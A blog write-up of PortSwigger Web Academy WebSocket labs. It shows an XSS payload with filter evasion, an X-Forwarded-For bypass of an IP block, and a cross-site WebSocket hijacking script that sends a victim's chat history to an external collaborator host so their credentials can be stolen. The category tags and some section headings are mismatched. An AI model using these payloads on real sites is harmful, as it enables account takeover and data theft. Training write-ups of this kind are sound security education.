---
title: (Portswigger/WebAcademy) - Websockets
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-01-15 09:00:00 +0200
categories: [Web Application, Insecure Deserialization]
tags: [Notes, Insecure Deserialization, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the insecure deserialization vulnerabilities.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/websockets) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.

## TOC
- [Intro](#intro)
  - [TOC](#toc)
- [Manipulating WebSocket messages to exploit vulnerabilities](#manipulating-websocket-messages-to-exploit-vulnerabilities)
- [Cross-site WebSocket hijacking](#cross-site-websocket-hijacking)
- [Manipulating the WebSocket handshake to exploit vulnerabilities](#manipulating-the-websocket-handshake-to-exploit-vulnerabilities)


# Manipulating WebSocket messages to exploit vulnerabilities
> This online shop has a live chat feature implemented using WebSockets.
> 
> Chat messages that you submit are viewed by a support agent in real time.
> 
> To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

When opening the lab, there is a `Live chat` page. If we check the requests, we will notice that web sockets are being sent.

![picture 0](/assets/images/7fdf9dee5c2ebc1318cd4b526ceb610710783a8dc2ad286d4748a561600693bb.png)  

Problem is that sockets aren't being sanitized when being sent directly!

![picture 1](/assets/images/abfbb54b7e4e02660f81913f81c0eaccf19ad6dc9d805ae465e2eecacf864e7b.png)  

# Cross-site WebSocket hijacking
> This online shop has a live chat feature implemented using WebSockets.
> 
> To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

In this lab, there is a XSS filter blocking our IP when trying to inject XSS payloads.

![picture 2](/assets/images/3bcb26a33a20db325e30bf36555bc4e96531de3b6ccfc29af1aa85b14c87cfde.png)  

We can however circumvent the IP block by using `X-Forwarded-For` header and reconnect our client to the websocket server.

![picture 3](/assets/images/41bd22efe7333621845f61f85839fbb7a804df62e324a2a1567c26b51bc6bbfb.png)  

Working payload: 
```
<img src=1 oNeRrOr=alert`1`>
```

![picture 4](/assets/images/40c0c4ebb4dd2499807a868403c645486dd4de7469f82a7f5a891c86444c12fd.png)  

XSS fires on the `/chat` page.

# Manipulating the WebSocket handshake to exploit vulnerabilities
> This online shop has a live chat feature implemented using WebSockets.
> 
> It has an aggressive but flawed XSS filter.
> 
> To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

Read the [portswigger's](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) article on cross-site websocket hijacking first, if not familiar with the attack. 


> Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 
> 
> Source: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

By access `/chat`, websockets are sent without any CSRF protection.

```
GET /chat HTTP/2
Host: 0a6b00630481157482b6c4f7004e008f.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0a6b00630481157482b6c4f7004e008f.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=6tzRfIhPXlNV1fZcX67LYDnFIwcJUP71
Sec-Websocket-Key: DyvNyiBfSYIGBxRpZJQHKQ==
```

Also by every subsequent chat message, CSRF is not being sent.

![picture 5](/assets/images/feb2b231eec8f60296f42fa60acdfde1a5680ce00545d6f55adf47a4930559e6.png)  

Consenquently, we can trick the victim to send it's messages to the same chat and exfiltrate the messages to the collaborator server.

```js
<script>
    var ws = new WebSocket('wss://0a5400fc03d9ed01817c750e00220084.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://b8kg1t8d2s3yfkrk5u9vjk5ktbz2n3bs.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

As seen below, we get messages that are being sent in the chat, by exploiting CSRF.

![picture 6](/assets/images/1ffe60e2f805c3765e914b2097a49858357fa6039640f22f09219a0a96df7120.png)  

Log in by using the stolen credentials to solve the lab.